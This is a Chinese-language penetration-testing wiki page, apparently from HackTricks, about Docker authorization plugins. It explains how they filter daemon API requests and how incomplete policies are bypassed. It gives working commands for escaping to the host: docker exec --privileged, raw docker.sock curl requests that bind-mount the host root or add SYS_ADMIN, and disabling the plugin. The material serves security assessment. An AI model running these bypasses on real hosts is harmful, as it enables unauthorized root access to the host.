# 运行时授权插件

{{#include ../../../banners/hacktricks-training.md}}

## 概述

Runtime authorization plugins 是一层额外的策略，用来决定调用者是否可以执行某个守护进程操作。Docker 是经典示例。默认情况下，任何能够与 Docker daemon 通信的人实际上都对其拥有广泛控制权。Authorization plugins 试图通过检查已认证的用户和请求的 API 操作，然后根据策略允许或拒绝请求，从而收窄这一模型。

这个主题值得单独成页，因为当攻击者已经能够访问 Docker API 或处于 `docker` 组中的用户时，它会改变利用模型。在这种环境下，问题不再只是“我能否到达 daemon？”，还包括“daemon 是否被授权层围栏保护，如果是，该层是否可以通过未处理的端点、薄弱的 JSON 解析，或 plugin-management 权限被绕过？”

## 运行机制

当请求到达 Docker daemon 时，authorization 子系统可以将请求上下文传递给一个或多个已安装的插件。插件能够看到已认证的用户身份、请求详情、选定的 headers，以及当内容类型合适时请求或响应体的部分内容。多个插件可以串联，只有当所有插件都允许请求时才授予访问。

这个模型听起来很强，但其安全性完全依赖于策略作者对 API 的理解有多完整。一个阻止 `docker run --privileged` 的插件如果忽略了 `docker exec`、遗漏了诸如顶级 `Binds` 的备用 JSON 键，或允许 plugin administration，可能会制造一种错误的受限感，同时仍然留下一些直接的 privilege-escalation 路径。

## 常见的插件目标

重要的策略审查领域包括：

- 容器创建端点
- `HostConfig` 字段，例如 `Binds`、`Mounts`、`Privileged`、`CapAdd`、`PidMode` 以及命名空间共享选项
- `docker exec` 行为
- plugin management 端点
- 任何可以间接触发运行时动作、超出预期策略模型的端点

历史上，像 Twistlock 的 `authz` 插件以及像 `authobot` 这样的简单教学插件让该模型易于研究，因为它们的策略文件和代码路径展示了端点到动作的映射是如何实际实现的。对于评估工作，重要的教训是策略作者必须理解完整的 API 面，而不仅仅是最显眼的 CLI commands。

## 滥用

首要目标是弄清楚实际被阻止了什么。如果 daemon 拒绝某个操作，错误信息通常会 leak 插件名称，这有助于识别正在使用的控制：
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
如果你需要更广泛的 endpoint profiling，像 `docker_auth_profiler` 这样的工具很有用，因为它们可以自动化本来重复的任务——检查哪些 API 路由和 JSON 结构确实被插件允许。

如果环境使用了自定义插件并且你可以与 API 交互，列举哪些对象字段实际上被过滤：
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
这些检查很重要，因为许多授权失败是字段特定的，而不是概念特定的。一个 plugin 可能会拒绝某个 CLI 模式，但并没有完全阻止等效的 API 结构。

### 完整示例：`docker exec` 在容器创建后增加权限

一个阻止特权容器创建但允许创建非受限容器并使用 `docker exec` 的策略，仍可能被绕过：
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
如果守护进程接受第二步，用户就能在策略作者认为受限的容器内恢复一个具有特权的交互式进程。

### 完整示例：Bind Mount Through Raw API

一些有缺陷的策略只检查单一的 JSON 结构。如果根文件系统的 bind mount 没有被一致地阻止，主机仍然可以被挂载：
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
相同的想法也可能出现在 `HostConfig` 下：
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
影响是完全的宿主机文件系统逃逸。有意思的细节是，这个绕过来自于策略覆盖不完整，而不是内核漏洞。

### 完整示例：未检查的 capability 属性

如果策略忘记过滤与 capability 相关的属性，攻击者可能会创建一个容器来重新获得危险的 capability：
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
一旦 `CAP_SYS_ADMIN` 或类似强权限存在，许多在 [capabilities.md](protections/capabilities.md) 和 [privileged-containers.md](privileged-containers.md) 中描述的逃逸技术就可以被利用。

### 完整示例：禁用插件

如果允许插件管理操作，最干净的绕过方法可能是直接完全关闭该控制：
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
这是一个控制平面级别的策略失败。授权层存在，但本应受限的用户仍保留禁用它的权限。

## Checks

这些命令用于判断策略层是否存在，以及其看起来是完整的还是表面的。
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
有趣的是：

- 包含插件名的拒绝消息可以确认存在授权层，并且经常暴露出确切的实现细节。
- 攻击者可见的插件列表可能足以判断是否可以执行禁用或重新配置操作。
- 仅阻止明显的 CLI 操作但不阻止原始 API 请求的策略，应被视为可绕过，直到证明不是这样为止。

## 运行时默认值

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 默认未启用 | 除非配置了授权插件，否则对守护进程的访问实际上是全有或全无 | 插件策略不完整，使用黑名单而非允许列表，允许插件管理，字段级盲点 |
| Podman | 没有常见的直接等价物 | Podman 通常更依赖于 Unix 权限、无 root 执行和 API 暴露决策，而不是 Docker 风格的授权插件 | 广泛暴露具有 root 权限的 Podman API、socket 权限过弱 |
| containerd / CRI-O | 不同的控制模型 | 这些运行时通常依赖于 socket 权限、节点信任边界和更高层编排器的控制，而不是 Docker 的授权插件 | 将 socket 挂载到工作负载中、基于节点的信任假设过弱 |
| Kubernetes | 在 API-server 和 kubelet 层使用 authn/authz，而不是 Docker authz 插件 | 集群 RBAC 和准入控制是主要的策略层 | 过于宽泛的 RBAC、薄弱的准入策略、直接暴露 kubelet 或运行时 API |
{{#include ../../../banners/hacktricks-training.md}}
